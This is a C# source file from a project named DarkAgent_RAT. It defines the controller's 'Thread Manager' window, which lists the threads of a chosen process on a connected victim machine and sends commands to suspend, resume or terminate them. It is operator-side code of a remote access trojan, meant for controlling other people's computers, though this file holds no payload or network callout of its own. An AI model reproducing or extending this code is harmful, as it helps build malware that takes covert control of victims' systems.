using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using DarkAgent_RAT.src.Events;
using DarkAgent_RAT.src.Network.DataNetwork;
using DarkAgent_RAT.src.Network.DataNetwork.Packets.Send;
using DarkAgent_RAT.src.Utils;

namespace DarkAgent_RAT
{
    public partial class ProcessThreads : DevComponents.DotNetBar.Office2007Form
    {
        public ProcessThreads()
        {
            InitializeComponent();
        }

        public string RemoteIP;
        public string ClientName;
        public int ClientID;
        public string ProcessName;
        public int PID;

        #region Speficic Events

        public void onProcessThreadInfo(object o, GetProcessesThreadEventArgs e)
        {
            try
            {
                if (e.RemoteIP != RemoteIP || PID != e._processThreadInfo.PID)
                    return;

                string[] str = new string[7];
                str[0] = e._processThreadInfo.ID.ToString();
                str[1] = Convert.ToBoolean(e._processThreadInfo.Pritioity).ToString();
                str[2] = e._processThreadInfo.WaitReason;
                str[3] = Convert.ToBoolean(e._processThreadInfo.PriorityBoost).ToString();
                str[4] = e._processThreadInfo.PrivilegedProcessorTime;
                str[5] = e._processThreadInfo.StartTime;
                str[6] = e._processThreadInfo.Threadstate;
                ListViewItem itm = new ListViewItem(str, 0);
                listView1.Items.Add(itm);
            }catch{}
        }

        public void onClientDisconnect(object o, ClientDisconnectEventArgs e)
        {
            if (RemoteIP == e.RemoteIP)
            {
                MessageBox.Show(ClientName + " has been disconnected from the server");
                this.Close();
            }
        }

        #endregion

        #region Form Events

        private void ProcessThreads_Load(object sender, EventArgs e)
        {
            this.Text = "DarkAgent - Thread Manager [" + RemoteIP.Split(':')[0] + "] [" + ClientName + "] [" + ProcessName + "]";
            GetProcessesThreadEvent.ClientProcessesThread += new GetProcessesThreadHandler(onProcessThreadInfo);
            ClientDisconnectEvent.ClientDisconnect += new ClientDisconnectHandler(onClientDisconnect);

            //send packet...
            RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_GetProcessThreads(RatClientProcessor.Instance._clientList[ClientID], PID));
        }

        private void suspendThreadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for(int i = 0; i < listView1.SelectedItems.Count; i++)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_ProcessModThread(RatClientProcessor.Instance._clientList[ClientID], PID, Convert.ToInt32(listView1.SelectedItems[i].SubItems[0].Text), 0));
        }

        private void resumeThreadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView1.SelectedItems.Count; i++)
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_ProcessModThread(RatClientProcessor.Instance._clientList[ClientID], PID, Convert.ToInt32(listView1.SelectedItems[i].SubItems[0].Text), 1));
        }

        private void terminateThreadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            for (int i = 0; i < listView1.SelectedItems.Count; i++)
            {
                RatClientProcessor.Instance._clientList[ClientID].SendPacket(new S_ProcessModThread(RatClientProcessor.Instance._clientList[ClientID], PID, Convert.ToInt32(listView1.SelectedItems[i].SubItems[0].Text), 2));
                listView1.SelectedItems[i].SubItems[2].Text = "Terminated";
            }
        }

        private void listView1_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            switch (e.Column)
            {
                case 0:
                    listView1.ListViewItemSorter = new ColumnSorter(0);
                    listView1.Sort();
                    break;
                case 1:
                    listView1.ListViewItemSorter = new ColumnSorter(1);
                    listView1.Sort();
                    break;
                case 2:
                    listView1.ListViewItemSorter = new ColumnSorter(2);
                    listView1.Sort();
                    break;
                case 3:
                    listView1.ListViewItemSorter = new ColumnSorter(3);
                    listView1.Sort();
                    break;
                case 4:
                    listView1.ListViewItemSorter = new ColumnSorter(4);
                    listView1.Sort();
                    break;
                case 5:
                    listView1.ListViewItemSorter = new ColumnSorter(5);
                    listView1.Sort();
                    break;
                case 6:
                    listView1.ListViewItemSorter = new ColumnSorter(6);
                    listView1.Sort();
                    break;
            }
        }

        private void copyToClipboardToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ClipboardBuilder cB = new ClipboardBuilder();
            for (int i = 0; i < listView1.SelectedItems.Count; i++)
            {
                cB.WriteLine("ID: " + listView1.SelectedItems[i].SubItems[0].Text);
                cB.WriteLine("Priority: " + listView1.SelectedItems[i].SubItems[1].Text);
                cB.WriteLine("Wait Reason: " + listView1.SelectedItems[i].SubItems[2].Text);
                cB.WriteLine("Priority Boost: " + listView1.SelectedItems[i].SubItems[3].Text);
                cB.WriteLine("Privileged Processor Time: " + listView1.SelectedItems[i].SubItems[4].Text);
                cB.WriteLine("Start Time: " + listView1.SelectedItems[i].SubItems[5].Text);
                cB.WriteLine("Thread State: " + listView1.SelectedItems[i].SubItems[6].Text);
                cB.WriteLine("");
            }
            if (!cB.Finish())
                MessageBox.Show("Error while copying data!");
        }

        #endregion
    }
}
